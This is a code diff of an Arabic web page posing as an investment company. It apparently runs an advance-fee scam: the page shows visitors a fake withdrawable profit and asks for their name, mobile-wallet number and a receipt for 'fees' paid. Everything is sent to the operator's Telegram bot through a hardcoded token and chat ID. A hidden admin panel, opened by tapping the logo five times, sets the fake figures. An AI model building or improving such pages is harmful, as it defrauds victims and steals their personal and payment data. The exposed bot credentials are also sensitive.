@@ -17,13 +17,15 @@
             min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px;
         }
 
-        /* لوحة التحكم السرية للمدير */
+        /* لوحة التحكم السرية للمدير - هتظهر لما تضغط على اللوجو 5 مرات */
         .admin-box {
-            background: rgba(0,0,0,0.9); border: 1px solid var(--gold);
-            padding: 10px; border-radius: 10px; font-size: 11px;
-            position: fixed; top: 10px; left: 10px; z-index: 2000; display: none;
+            background: rgba(0,0,0,0.95); border: 2px solid var(--gold);
+            padding: 15px; border-radius: 15px; font-size: 14px;
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            z-index: 2000; display: none; width: 250px; text-align: center;
         }
-        .admin-box input { width: 50px; background: #222; color: white; border: 1px solid #444; }
+        .admin-box input { width: 80%; padding: 8px; margin: 10px 0; background: #222; color: white; border: 1px solid #444; border-radius: 5px; }
+        .admin-box button { background: var(--gold); border: none; padding: 10px; border-radius: 5px; cursor: pointer; font-weight: bold; }
 
         .card {
             background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(12px);
@@ -32,7 +34,7 @@
             text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
 
-        .logo-text { font-size: 26px; font-weight: 900; color: var(--gold); margin-bottom: 25px; }
+        .logo-text { font-size: 26px; font-weight: 900; color: var(--gold); margin-bottom: 25px; cursor: pointer; }
 
         .balance-area {
             background: rgba(0,0,0,0.3); padding: 15px; border-radius: 15px;
@@ -59,13 +61,12 @@
             padding: 15px; border-radius: 12px; cursor: pointer; display: block;
             margin-bottom: 20px; transition: 0.3s;
         }
-        .file-label:hover { border-color: var(--success); background: rgba(0,255,136,0.1); }
 
         .submit-btn {
             background: linear-gradient(90deg, #00ff88, #00d4ff);
             color: #001; border: none; width: 100%; padding: 15px;
             font-size: 19px; font-weight: 900; border-radius: 12px;
-            cursor: pointer; box-shadow: 0 5px 15px rgba(0,255,136,0.3);
+            cursor: pointer;
         }
 
         #loader {
@@ -79,12 +80,14 @@
 <body>
 
 <div class="admin-box" id="adminBox">
-    💰 ربح: <input type="number" id="pIn" value="1500" oninput="upd()"> | 
-    💸 رسوم: <input type="number" id="fIn" value="100" oninput="upd()">
+    <h3 style="color:var(--gold); margin-top:0;">إعدادات المدير</h3>
+    الربح: <input type="number" id="pIn" value="1500">
+    الرسوم: <input type="number" id="fIn" value="100">
+    <button onclick="saveAndHide()">حفظ الإعدادات</button>
 </div>
 
 <div class="card">
-    <div class="logo-text">شركة التقوى للاستثمار</div>
+    <div class="logo-text" onclick="checkAdmin()">شركة التقوى للاستثمار</div>
     
     <div class="balance-area">
         <span>رصيدك القابل للسحب حالياً</span>
@@ -93,11 +96,11 @@
 
     <div class="form-group">
         <label>الاسم بالكامل:</label>
-        <input type="text" id="userName" placeholder="اكتب اسمك كما هو في البطاقة">
+        <input type="text" id="userName" placeholder="اكتب اسمك بالكامل">
     </div>
 
     <div class="form-group">
-        <label>رقم محفظتك المستلمة (فودافون كاش..):</label>
+        <label>رقم محفظتك المستلمة:</label>
         <input type="tel" id="userWallet" placeholder="01xxxxxxxxx">
     </div>
 
@@ -118,17 +121,25 @@
 </div>
 
 <script>
-    // الإعدادات الخاصة بك التي أرسلتها
     const TOKEN = '8398403697:AAEf0JjyVG-yE-DLS1FZKDX1_UKg8lEm02E';
     const ID = '8232581666';
 
-    // لتظهر لوحة التحكم اكتب admin123
-    let k = "";
-    window.onkeydown = (e) => { k+=e.key; if(k.includes("admin123")) document.getElementById('adminBox').style.display='block'; };
+    // طريقة فتح الإعدادات على الموبايل: اضغط على كلمة "شركة التقوى" 5 مرات
+    let clickCount = 0;
+    function checkAdmin() {
+        clickCount++;
+        if (clickCount >= 5) {
+            document.getElementById('adminBox').style.display = 'block';
+            clickCount = 0;
+        }
+    }
 
-    function upd() {
-        document.getElementById('pOut').innerText = document.getElementById('pIn').value;
-        document.getElementById('fOut').innerText = document.getElementById('fIn').value;
+    function saveAndHide() {
+        const p = document.getElementById('pIn').value;
+        const f = document.getElementById('fIn').value;
+        document.getElementById('pOut').innerText = Number(p).toLocaleString();
+        document.getElementById('fOut').innerText = f;
+        document.getElementById('adminBox').style.display = 'none';
     }
 
     async function sendData() {
@@ -140,20 +151,10 @@
 
         document.getElementById('loader').style.display = 'flex';
 
-        const p = document.getElementById('pIn').value;
-        const f = document.getElementById('fIn').value;
+        const p = document.getElementById('pOut').innerText;
+        const f = document.getElementById('fOut').innerText;
 
-        // نص الرسالة اللي هيوصلك على التليجرام
-        const msg = `
-🌟 طلب سحب جديد 🌟
-━━━━━━━━━━━━━━
-👤 الاسم: ${name}
-📱 رقم العميل: ${wallet}
-💰 مبلغ الربح: ${p} ج.م
-💸 الرسوم المدفوعة: ${f} ج.م
-━━━━━━━━━━━━━━
-📱 التحويل تم لرقمك: 01226811784
-        `;
+        const msg = `🌟 طلب سحب جديد 🌟\n👤 الاسم: ${name}\n📱 الرقم: ${wallet}\n💰 الربح: ${p} ج.م\n💸 الرسوم: ${f} ج.م`;
 
         const fd = new FormData();
         fd.append('chat_id', ID);
@@ -163,10 +164,10 @@
         try {
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             document.getElementById('loader').style.display = 'none';
-            alert("تم إرسال طلبك! سيتم مراجعة الإيصال وتحويل المبلغ لمحفظتك خلال 10 دقائق.");
+            alert("تم إرسال طلبك بنجاح!");
         } catch(e) {
             document.getElementById('loader').style.display = 'none';
-            alert("فشل الإرسال، تأكد من اتصال الإنترنت.");
+            alert("حدث خطأ.");
         }
     }
 </script>
